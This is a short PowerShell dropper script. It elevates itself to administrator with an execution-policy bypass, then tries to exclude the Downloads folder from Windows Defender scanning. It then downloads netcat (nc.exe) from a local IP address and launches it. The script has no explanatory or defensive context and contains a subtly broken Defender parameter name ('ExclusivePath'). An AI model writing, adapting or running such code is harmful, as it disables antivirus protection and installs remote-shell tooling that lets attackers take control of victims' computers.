# Check if script is running with Administrator privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltinRole] "Administrator")) {

    # Relaunch the script with admin privileges
    $scriptPath = $MyInvocation.MyCommand.Definition
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
    exit
}

Add-MpPreference -ExclusivePath $env:USERPROFILE\Downloads
$url = 'http://192.168.0.111/nc.exe'
$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'nc.exe')

Start-Sleep -Milliseconds 100

Invoke-Webrequest -Uri $url -OutFile $outputFile

Start-Process -FilePath $outputFile
